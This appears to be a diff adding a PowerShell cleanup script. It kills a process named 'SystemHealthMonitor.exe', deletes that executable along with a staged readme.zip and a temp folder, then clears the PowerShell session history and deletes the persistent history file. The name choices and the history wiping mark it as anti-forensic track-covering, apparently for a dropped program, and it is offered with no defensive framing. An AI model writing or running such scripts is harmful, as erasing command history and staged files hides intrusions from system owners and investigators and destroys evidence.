@@ -1,0 +1,39 @@
+taskkill /f /im SystemHealthMonitor.exe
+
+  # Paths to target
+$workingDir = "$env:TEMP\SystemHealth"
+$zipPath = "$workingDir\readme.zip"
+$documentsExe = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "SystemHealthMonitor.exe"
+
+# Delete the EXE in Documents
+if (Test-Path $documentsExe) {
+    Remove-Item -Path $documentsExe -Force
+    Write-Output "Deleted: $documentsExe"
+} else {
+    Write-Output "Not found: $documentsExe"
+}
+
+# Delete the ZIP
+if (Test-Path $zipPath) {
+    Remove-Item -Path $zipPath -Force
+    Write-Output "Deleted: $zipPath"
+} else {
+    Write-Output "Not found: $zipPath"
+}
+
+# Delete the temp extracted folder
+if (Test-Path $workingDir) {
+    Remove-Item -Path $workingDir -Recurse -Force
+    Write-Output "Deleted folder: $workingDir"
+} else {
+    Write-Output "Not found: $workingDir"
+}
+# Clear current session history
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+
+# Delete persistent history file
+$histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $histPath) {
+    Remove-Item $histPath -Force
+}
+exit
